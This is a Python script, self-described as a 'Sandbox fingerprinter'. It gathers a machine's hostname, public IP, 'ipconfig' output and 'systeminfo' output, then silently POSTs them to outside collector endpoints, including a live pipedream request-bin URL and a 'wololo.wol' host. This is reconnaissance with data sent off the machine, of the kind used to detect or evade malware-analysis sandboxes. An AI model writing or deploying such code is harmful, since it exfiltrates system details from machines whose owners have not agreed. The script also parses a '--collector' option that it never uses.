import argparse
# from helpers import is_running_standalone, get_default_root
from os.path import join, isfile, basename
import logging
import requests
from platform import node
import subprocess
import json
import datetime
from utilities import gen_report_zip, generate_agent_id

# TMP
from ipdb import set_trace

logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S',)
logger = logging.getLogger(__name__)


collector_url = r"https://en2ygewgpwabg.x.pipedream.net"
# collector_urls = [r"https://en2ygewgpwabg.x.pipedream.net", r"https://httpreq.com/damp-fire-bwgh405c/record", r"https://wubba-dubba.free.beeceptor.com"]
collector_urls = [r"http://wololo.wol:8888/sandbox-report"]

parser = argparse.ArgumentParser(description='Enter Sandbox fingerprinter')
parser.add_argument('-c', '--collector', dest='collector', action='store', default=collector_url, help='collector url')
args = parser.parse_args()

def exec_commmand(command):
    cmdout_bytes = subprocess.run(command, stdout=subprocess.PIPE).stdout
    try:
        return cmdout_bytes.decode()
    except UnicodeDecodeError:
        try:
            return cmdout_bytes.decode("cp850")
        except UnicodeDecodeError:
            try:
                return cmdout_bytes.decode("cp1252")
            except UnicodeDecodeError:
                try:
                    return cmdout_bytes.decode("utf8")
                except UnicodeDecodeError:
                    return cmdout_bytes.decode("utf8", errors="backslashreplace")


def main():
    # agent id
    agent_id = generate_agent_id()

    ## Generate sandbox report
    # get time utc
    current_utc = str(datetime.datetime.utcnow())

    # get hostname
    hostname = node()

    # get network interfaces
    ipconfig = exec_commmand(["ipconfig"])

    # get os infos
    systeminfo = exec_commmand(["systeminfo"])

    # get @public_ip
    ip = requests.get(r"https://ifconfig.me").content.decode()

    sandbox_report = {
        "hostname" : hostname,
        "ip" : ip,
        "current_utc" : current_utc,
        "ipconfig" : ipconfig,
        "systeminfo" : systeminfo
    }

    report = gen_report_zip(agent_id, sandbox_report)
    # print(json.dumps(out))
    for collector_url in collector_urls:
        try:
            r = requests.post(collector_url, json=report)
        except Exception as e:
            print(f"Error while connecting to {collector_url}\nreason: {e}")


if __name__ == "__main__":
    main()
